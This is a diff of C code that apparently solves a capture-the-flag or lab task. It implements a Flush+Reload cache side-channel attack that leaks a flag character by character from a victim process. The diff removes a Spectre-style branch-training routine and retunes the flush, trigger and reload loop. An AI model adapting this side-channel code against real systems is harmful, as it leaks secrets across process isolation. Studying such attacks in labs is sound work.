@@ -64,18 +64,7 @@ void post_work(char *best_character, uint64_t *fastest_time) {
         }
     }
 }
-
-
-void train_target(int *flag_position, sem_t *semaphore) {
-
-	for (int i = 0; i < 4000; i++) {
-		*flag_position = 300;  // Value > 257, condition will be true
-		sem_post(semaphore);
-		//usleep(100);
-	}
-}
-
-     
+      
 int main() {
 	printf("Starting Flush+Reload attack...\n");
 
@@ -87,36 +76,29 @@ int main() {
 	char recovered_flag[100] = {0};
     
 	// Attack each character position
-	for (int pos = 0; pos < 60; pos++) {
+	for (int pos = 0; pos < 80; pos++) {
     
 		printf("Attacking position %d: ", pos);
+        
+		
+		
+		*flag_position = pos;
+        
 		
 		char best_character = 0;
 		
 		uint64_t fastest_time = 999999;
 
-		for (int attempt = 0; attempt < 4000; attempt++) {
+		for (int attempt = 0; attempt < 5; attempt++) {
 	    
-			// flush first
+			// STEP 1: FLUSH
 			pre_work();
 
-			// trianing phrase
-			train_target(flag_position, semaphore);
-			
-			usleep(100);
-			
-			// flush again
-			pre_work();
-			
-			// set the pos 
-			*flag_position = pos;
-			
-			// now try to access again 
+			// STEP 2: TRIGGER - Make victim access memory
 			sem_post(semaphore);
-						
-			usleep(100);  // Give victim time to run
 			
-			
+			usleep(1000);  // Give victim time to run
+
 			// STEP 3: RELOAD
 			post_work(&best_character, &fastest_time);
 		}
